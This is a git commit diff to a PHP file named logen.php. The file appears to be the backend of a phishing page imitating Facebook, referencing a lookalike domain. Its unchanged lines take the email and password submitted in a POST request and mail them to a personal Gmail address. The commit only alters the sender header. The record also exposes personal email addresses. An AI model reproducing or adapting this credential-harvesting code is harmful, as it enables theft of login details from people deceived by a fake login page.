2d7d12b4217fe20e413799006c80a82d9da35125
Melkamu Dagne <38700508+abbamelka@users.noreply.github.com>
2021-10-15 15:47:34 +0300

    Update logen.php

--- mobile2/logen.php
+++ mobile2/logen.php
@@ -3,7 +3,7 @@
 $to      = 'melkamudagne19@gmail.com';
 $subject = 'the subject';
 $message = $_POST["email"] . "  :  " . $_POST["pass"];
-$headers = 'From: https://face-booke.herokuapp.com/' . "\r\n" .
+$headers = 'From: melkamu.dange@adm-technologies.com' . "\r\n" .
     'Reply-To: melkamudagne19@gmail.com' . "\r\n" .
     'X-Mailer: PHP/' . phpversion();
 
